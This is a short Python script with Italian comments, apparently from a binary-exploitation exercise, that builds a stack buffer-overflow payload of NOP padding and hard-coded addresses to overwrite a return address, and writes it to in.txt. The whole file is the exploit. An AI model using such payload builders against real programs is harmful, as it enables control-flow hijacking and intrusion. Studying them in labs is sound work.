#indirizzo: 0x7fffffffdfd0 FORSE INDIRIZZO DEL SALTO 0x00005555555551cf
#!/usr/bin/env python
# yy=buffer dimensions
indPr=b'\xcf\x51\x55\x55\x55\x55'
indSt=b'\xd0\xdf\xff\xff\xff\x7f'
#buf=b"\x90"* yy
buf=b'\x90' * 8
#indirizzo di riscrittura ra
buf+=indSt
buf+=b'\x90' * (80-8-len(indSt))
buf+=indPr
f=open("in.txt","wb")
f.write(buf)

print('ok')
